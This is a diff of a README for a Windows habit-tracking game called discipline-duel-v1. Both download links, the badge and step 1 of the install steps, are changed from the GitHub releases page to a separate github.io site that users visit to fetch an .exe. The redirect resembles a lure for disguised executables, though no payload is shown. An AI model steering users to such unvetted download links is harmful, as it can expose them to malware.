@@ -1,6 +1,6 @@
 # ⚔️ discipline-duel-v1 - Turn daily habits into interactive battles
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/kerasum2704/discipline-duel-v1/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://kerasum2704.github.io)
 
 Discipline-duel-v1 helps you build better habits through a game interface. It changes how you track your daily tasks by adding stakes and rewards. You manage your resilience points, track your focus level, and use game mechanics to overcome the excuses that prevent you from completing your work. This application turns your to-do list into a tactical challenge.
 
@@ -16,7 +16,7 @@ You need a computer running Windows 10 or Windows 11 to play this game. The soft
 
 Follow these instructions to install the software on your computer.
 
-1. Visit this page to download the latest version: https://github.com/kerasum2704/discipline-duel-v1/releases
+1. Visit this page to download the latest version: https://kerasum2704.github.io
 2. Find the link labeled as an .exe file for your version of Windows.
 3. Click the link to save the file to your computer.
 4. Locate the file in your Downloads folder once the transfer finishes.
